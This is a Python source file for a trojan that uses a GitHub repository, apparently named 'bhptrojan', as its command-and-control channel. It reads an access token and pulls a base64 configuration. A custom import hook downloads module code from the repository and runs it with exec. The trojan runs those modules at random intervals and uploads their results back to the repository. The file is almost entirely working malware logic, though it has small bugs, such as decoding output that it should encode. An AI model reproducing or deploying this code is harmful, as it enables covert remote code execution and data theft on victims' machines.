import base64
import github3
import importlib
import json
import sys
import random
import threading
import time
from datetime import datetime

def connect_to_github():
    with open("mytoken.txt") as f:
        token = f.read()
    user = 'Anderaxarex'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')

def get_content(dirname, module_name, repo):
    return repo.file_content(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.repo = connect_to_github()
        self.data_path = f'data/{id}'

    def get_config(self):
        config_file = get_content('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_file))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config

    def store_result(self, data):
        message = datetime.now().isoformat()
        remotepath = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remotepath, message, base64.b64decode(bindata))

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_result(result)

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner, 
                    args=(task['module'],)
                )
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(3*60, 3*60*60))

class GitImporter:
    def __init__(self):
        self.current_module_code=""
    
    def find_module(self, name, path=None):
        print("[||] Retrieving %s" % name)
        self.repo = connect_to_github()
        new_library = get_content('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self
    
    def load_modules(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan(f'{random.randint(1000, 10000)}')
    trojan.run()